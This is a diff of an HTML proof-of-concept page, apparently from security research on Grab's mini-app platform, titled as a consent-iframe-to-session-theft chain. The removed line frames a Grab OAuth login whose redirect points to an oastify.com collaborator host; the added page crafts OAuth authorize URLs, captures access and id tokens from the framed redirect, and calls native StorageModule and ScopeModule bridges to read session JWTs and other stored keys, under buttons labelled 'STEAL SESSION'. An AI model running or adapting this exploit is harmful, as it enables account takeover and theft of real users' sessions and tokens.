@@ -1,1 +1,313 @@
-<iframe src="https://weblogin.grab.com/passenger/login?auth_endpoint=https%3A%2F%2Fapi.grab.com%2Fgrabid%2Fv1%2Foauth2%2Fauthorize&browser=Unknown%3A0.0&client_id=c1de46cbdd5b494da253d3c860995885&code_challenge=P6sLe0c__JOgITXdrorN9aH9s2D1ZDRFu0svd267CPE&code_challenge_method=S256&ctx_id=63ba254aa77140e99e8ddbe360c692e4&device_type=Unknown&gw=agw&login_method=pax&nonce=d8335d892ec75d5c56481f5ee14ade2e&redirect=https%3A%2F%2F1qs3gknrtqqp6fv8cpc1l0srfil998xx.oastify.com&request_id=da557545-04f9-4050-a410-961a6135d7d0&response_type=id_token%20token&scope=openid%20phone%20profile.read%20mobile.geolocation%20mobile.checkout%20mobile.cx.miniapp%20mobile.storage&service_id=PASSENGER&state=37dda3f479142c7ba9d5b96a13653944" width="100%" height="600"></iframe>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PlaysOut Chain</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,sans-serif;background:#0a0a0a;color:#e0e0e0;padding:12px;font-size:13px}
+pre{background:#111;border:1px solid #222;border-radius:8px;padding:10px;font-size:10px;white-space:pre-wrap;word-break:break-all;margin:6px 0;color:#aaa;max-height:250px;overflow-y:auto}
+button{padding:10px 16px;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;color:#fff;margin:3px 0;width:100%}
+.green{background:#00b14f}.red{background:#b71c1c}.blue{background:#1565c0}.purple{background:#6a1b9a}.gray{background:#333;color:#aaa}
+.ok{color:#66bb6a}.err{color:#ef5350}.info{color:#42a5f5}.warn{color:#ffb74d}
+.banner{padding:10px;border-radius:8px;margin:6px 0;font-family:monospace;font-size:11px;word-break:break-all}
+.banner.ok{background:#1b5e20;border:1px solid #2e7d32;color:#a5d6a7}
+.banner.fail{background:#b71c1c;border:1px solid #c62828;color:#ef9a9a}
+.banner.wait{background:#333;border:1px solid #444;color:#aaa}
+.step{background:#111;border:1px solid #222;border-radius:8px;padding:10px;margin:6px 0}
+.step h3{font-size:12px;color:#90caf9;margin-bottom:6px}
+#consent-frame{width:100%;border:1px solid #333;border-radius:8px;background:#000}
+</style>
+</head>
+<body>
+
+<h2 style="color:#00b14f">PlaysOut — iframe Consent → Steal Session</h2>
+<p style="color:#555;font-size:10px;margin-bottom:8px">
+  Step 1: iframe loads GrabID consent (PlaysOut client_id)<br>
+  Step 2: after user consents → reloadScopes → StorageModule.getString
+</p>
+
+<!-- ══ Step 1: Consent iframe ══ -->
+<div class="step">
+  <h3>Step 1 — GrabID Consent (PlaysOut)</h3>
+  <button class="purple" onclick="loadConsent()">Load Consent iframe</button>
+  <button class="gray" onclick="genFresh()">Generate fresh URL</button>
+  <div id="iframe-status" style="color:#555;font-size:10px;margin-top:4px"></div>
+  <iframe id="consent-frame" height="500" style="display:none"
+    sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
+</div>
+
+<!-- ══ Step 2: Steal ══ -->
+<div class="step">
+  <h3>Step 2 — Steal StorageModule</h3>
+  <button class="green" onclick="steal()">STEAL SESSION</button>
+  <button class="blue" onclick="stealAll()">STEAL ALL KEYS</button>
+  <button class="gray" onclick="checkBridge()">Check bridges</button>
+</div>
+
+<div id="banner"></div>
+<pre id="out">Tap "Load Consent iframe" first, then "STEAL SESSION" after user logs in.</pre>
+
+<script>
+// ════════════════════════════════════════════════════════════════
+// SDK bridge runtime (index.esm-D3z_6957.js verbatim)
+// ════════════════════════════════════════════════════════════════
+var SDK=(function(){
+  var X={};
+  function sub(fn){var d=false;return{isUnsubscribed:function(){return d},unsubscribe:function(){if(!d){fn();d=true}}}}
+  function stream(s){return{subscribe:s,then:function(ok,fail){return new Promise(function(res,rej){try{var h=null,done=false;h=s({next:function(v){res(ok?ok(v):v);if(h)h.unsubscribe();done=true}});if(done&&h)h.unsubscribe()}catch(e){fail==null?rej(e):res(fail(e))}})}}}
+  function cn(ctx,mod,fn){var id=0;return function(){var n="";while((n=mod+"_"+fn+"Callback_"+id)in ctx)id++;id++;return n}}
+  function wc(ctx,o){return stream(function(obs){var s,nm=o.cf();ctx[nm]=function(r){var res=r.result===null?undefined:r.result;var err=r.error===null?undefined:r.error;if(obs&&obs.next)obs.next({result:res,error:err,status_code:r.status_code})};o.w(nm);s=sub(function(){ctx[nm]=undefined});return s})}
+  X.env=function(w,m){return w[m]?"android":w.webkit&&w.webkit.messageHandlers&&w.webkit.messageHandlers[m]?"ios":undefined};
+  X.wrap=function(w,m){w["Wrapped"+m]=(function(ctx,name,call){return{invoke:function(met,par){return wc(ctx,{cf:cn(ctx,name,met),w:function(cb){call({callback:cb,method:met,module:name,parameters:par||{}})}})}}})(w,m,function(msg){if(w[m]&&w[m][msg.method]instanceof Function)w[m][msg.method](JSON.stringify(msg));else if(w.webkit&&w.webkit.messageHandlers&&w.webkit.messageHandlers[m])w.webkit.messageHandlers[m].postMessage(msg);else throw new Error("No bridge: "+m+"."+msg.method)})};
+  return X
+})();
+
+// ════════════════════════════════════════════════════════════════
+// PlaysOut config
+// ════════════════════════════════════════════════════════════════
+var CID="3c0a913283904301b4011998f705ad00";
+var REDIR="https://grab.fantacore.io";
+var AUTHORIZE="https://api.grab.com/grabid/v1/oauth2/authorize";
+var SCOPE="openid+phone+profile.read+mobile.geolocation+mobile.checkout+mobile.cx.miniapp+mobile.storage";
+
+var ALL_KEYS=[
+  {key:"grab_platform_session_v2",     method:"getString",  desc:"PlaysOut JWT+userId+expiresAt"},
+  {key:"grab_platform_session_v1",     method:"getString",  desc:"PlaysOut session v1"},
+  {key:"grab_platform_pending_auth_v2",method:"getString",  desc:"pending auth v2"},
+  {key:"grab_platform_pending_auth_v1",method:"getString",  desc:"pending auth v1"},
+  {key:"grab_platform_auth_issue_v2",  method:"getString",  desc:"auth issue v2"},
+  {key:"mock_auth_recent_games",       method:"getString",  desc:"recent games"},
+  {key:"playsout_gems",               method:"getString",  desc:"gems count"},
+  {key:"hello_ride:grabIdAgree",       method:"getBoolean", desc:"HelloRide consent"},
+];
+
+// ════════════════════════════════════════════════════════════════
+// UI
+// ════════════════════════════════════════════════════════════════
+var out=document.getElementById("out");
+var bannerEl=document.getElementById("banner");
+function print(cls,msg){out.innerHTML+='<span class="'+cls+'">'+msg+'</span>\n';out.scrollTop=out.scrollHeight}
+function showBanner(cls,text){bannerEl.className="banner "+cls;bannerEl.textContent=text}
+
+function ensureWrapped(mod){
+  if(!window["Wrapped"+mod]){
+    var env=SDK.env(window,mod);
+    if(!env)throw new Error(mod+" not available");
+    SDK.wrap(window,mod)
+  }
+}
+async function invoke(mod,method,params){
+  ensureWrapped(mod);
+  return window["Wrapped"+mod].invoke(method,params||{})
+}
+
+// ════════════════════════════════════════════════════════════════
+// PKCE (from IdentityModule.generatePKCEArtifacts)
+// ════════════════════════════════════════════════════════════════
+function rnd(n){var a=new Uint8Array(n);crypto.getRandomValues(a);return String.fromCharCode.apply(null,a)}
+function b64u(s){return btoa(s).replace(/=/g,"").replace(/\+/g,"-").replace(/\//g,"_")}
+async function sha256(s){return b64u(String.fromCharCode.apply(null,new Uint8Array(await crypto.subtle.digest("SHA-256",new TextEncoder().encode(s)))))}
+
+// ════════════════════════════════════════════════════════════════
+// Step 1: Generate consent URL and load in iframe
+//
+// Flow: hit authorize endpoint → 302 → weblogin.grab.com consent URL
+// Evidence: curl confirmed 302 without X-Frame-Options
+// ════════════════════════════════════════════════════════════════
+async function genFresh(){
+  out.textContent="";
+  print("info","Generating fresh consent URL...");
+
+  var verifier=b64u(rnd(64));
+  var nonce=b64u(rnd(16));
+  var state=b64u(rnd(32));
+  var challenge=await sha256(verifier);
+  var redirEnc=encodeURIComponent(REDIR);
+
+  var authUrl=AUTHORIZE
+    +"?client_id="+CID
+    +"&redirect_uri="+redirEnc
+    +"&response_type="+encodeURIComponent("id_token token")
+    +"&scope="+SCOPE
+    +"&state="+state
+    +"&nonce="+nonce
+    +"&code_challenge="+challenge
+    +"&code_challenge_method=S256";
+
+  print("info","Fetching 302 from authorize...");
+  showBanner("wait","Fetching consent URL...");
+
+  try{
+    var resp=await fetch(authUrl,{redirect:"manual",credentials:"omit"});
+
+    if(resp.type==="opaqueredirect"){
+      // Can't read Location header from JS — use the authUrl directly
+      // weblogin.grab.com accepts the authorize URL as-is and renders consent
+      print("warn","Got opaqueredirect — using authorize URL directly");
+      print("info","URL: "+authUrl.substring(0,80)+"...");
+      loadIframe(authUrl);
+      return
+    }
+
+    if(resp.status===302){
+      var loc=resp.headers.get("location");
+      if(loc){
+        print("ok","Got consent URL: "+loc.substring(0,80)+"...");
+        loadIframe(loc);
+        return
+      }
+    }
+
+    print("warn","Status "+resp.status+" — loading authorize URL directly");
+    loadIframe(authUrl)
+  }catch(e){
+    // CORS expected in browser — just load the authorize URL, browser will follow 302
+    print("warn","Fetch blocked (CORS) — loading authorize URL in iframe directly");
+    loadIframe(authUrl)
+  }
+}
+
+function loadConsent(){
+  // Use a pre-baked consent URL (generated server-side via gen-consent-url.sh)
+  // OR generate fresh client-side
+  genFresh()
+}
+
+var iframeLoads=0;
+function loadIframe(url){
+  var frame=document.getElementById("consent-frame");
+  frame.style.display="block";
+  frame.src="about:blank";
+  iframeLoads=0;
+
+  document.getElementById("iframe-status").textContent="Loading consent...";
+  showBanner("wait","Consent page loading in iframe...");
+
+  frame.onload=function(){
+    iframeLoads++;
+    var status="Load #"+iframeLoads;
+    try{
+      var loc=frame.contentWindow.location.href;
+      status+=" — "+loc.substring(0,60);
+      print("info","iframe #"+iframeLoads+": "+loc.substring(0,80));
+
+      // Check if redirected back to fantacore.io with tokens
+      if(loc.indexOf("grab.fantacore.io")>=0||loc.indexOf("fantacore")>=0){
+        var hash=loc.split("#")[1]||"";
+        var hp=new URLSearchParams(hash);
+        var at=hp.get("access_token");
+        var it=hp.get("id_token");
+        if(at||it){
+          print("ok","\n=== OAUTH TOKENS CAPTURED ===");
+          if(at)print("ok","access_token: "+at.substring(0,50)+"...");
+          if(it)print("ok","id_token: "+it.substring(0,50)+"...");
+          showBanner("ok","OAUTH COMPLETE — now tap STEAL SESSION");
+          status+=" — TOKENS!";
+        }else{
+          print("info","Landed on fantacore.io — consent complete, now tap STEAL SESSION");
+          showBanner("ok","CONSENT DONE — tap STEAL SESSION");
+        }
+      }
+    }catch(e){
+      status+=" — cross-origin";
+      print("info","iframe #"+iframeLoads+": cross-origin (consent page)")
+    }
+    document.getElementById("iframe-status").textContent=status
+  };
+
+  frame.src=url
+}
+
+// ════════════════════════════════════════════════════════════════
+// Step 2: Steal session from StorageModule
+// Evidence: grab.fantacore.io uses:
+//   StorageModule.setString("grab_platform_session_v2", JSON.stringify({
+//     accessToken: "...", user: {id: "..."}, expiresAt: ...
+//   }))
+// ════════════════════════════════════════════════════════════════
+async function steal(){
+  out.textContent="";
+  bannerEl.className="";bannerEl.textContent="";
+
+  print("info","[1] ScopeModule.reloadScopes()...");
+  try{
+    var sr=await invoke("ScopeModule","reloadScopes");
+    print(sr.status_code>=200&&sr.status_code<300?"ok":"warn","    → "+sr.status_code)
+  }catch(e){print("warn","    → "+e.message)}
+
+  print("info","[2] StorageModule.getString(\"grab_platform_session_v2\")...");
+  try{
+    var r=await invoke("StorageModule","getString",{key:"grab_platform_session_v2"});
+    print("info","    → status_code: "+r.status_code);
+
+    if(r.status_code===200&&typeof r.result==="string"){
+      var p=null;try{p=JSON.parse(r.result)}catch(e){}
+      print("ok","\n=== SESSION STOLEN ===");
+      if(p){
+        print("ok","accessToken: "+(p.accessToken||"?"));
+        if(p.user)print("ok","userId: "+p.user.id);
+        print("ok","expiresAt: "+p.expiresAt);
+        print("info","\nFull:");
+        print("ok",JSON.stringify(p,null,2));
+        showBanner("ok","SESSION STOLEN\naccessToken: "+(p.accessToken?p.accessToken.substring(0,60)+"...":"?")+"\nuserId: "+(p.user?p.user.id:"?"))
+      }else{
+        print("ok","Raw: "+r.result);
+        showBanner("ok","SESSION STOLEN (raw)\n"+r.result.substring(0,200))
+      }
+    }else if(r.status_code===204){
+      print("warn","Empty (204) — no PlaysOut session");
+      showBanner("fail","NO SESSION — user hasn't logged into PlaysOut")
+    }else{
+      print("err",""+r.status_code+" "+(r.error||""));
+      showBanner("fail","FAILED: "+r.status_code)
+    }
+  }catch(e){
+    print("err",e.message);
+    showBanner("fail","BRIDGE ERROR: "+e.message)
+  }
+}
+
+async function stealAll(){
+  out.textContent="";
+  bannerEl.className="";bannerEl.textContent="";
+
+  print("info","[1] reloadScopes...");
+  try{var sr=await invoke("ScopeModule","reloadScopes");print("info","    → "+sr.status_code)}catch(e){print("warn","    → "+e.message)}
+
+  print("info","[2] Reading "+ALL_KEYS.length+" keys...\n");
+  var stolen={};
+  for(var i=0;i<ALL_KEYS.length;i++){
+    var k=ALL_KEYS[i];
+    try{
+      var r=await invoke("StorageModule",k.method,{key:k.key});
+      if(r.status_code===200&&r.result!==undefined&&r.result!==null){
+        stolen[k.key]=r.result;
+        print("ok","[HIT] "+k.key+" = "+String(r.result).substring(0,80))
+      }else{
+        print("gray","[---] "+k.key+" → "+(r.status_code===204?"empty":r.status_code))
+      }
+    }catch(e){print("err","[ERR] "+k.key+" → "+e.message)}
+  }
+  var c=Object.keys(stolen).length;
+  if(c){
+    print("ok","\n"+JSON.stringify(stolen,null,2));
+    showBanner("ok",c+" KEYS STOLEN\n"+Object.keys(stolen).join(", "))
+  }else{
+    showBanner("fail","No keys found")
+  }
+}
+
+function checkBridge(){
+  out.textContent="";
+  ["ScopeModule","StorageModule","ContainerModule","IdentityModule","CheckoutModule","ProfileModule","LocationModule","NetworkModule"].forEach(function(m){
+    var e=SDK.env(window,m);
+    print(e?"ok":"err",(e?"[YES] ":"[---] ")+m+(e?" ("+e+")":""))
+  })
+}
+
+checkBridge();
+</script>
+</body>
+</html>
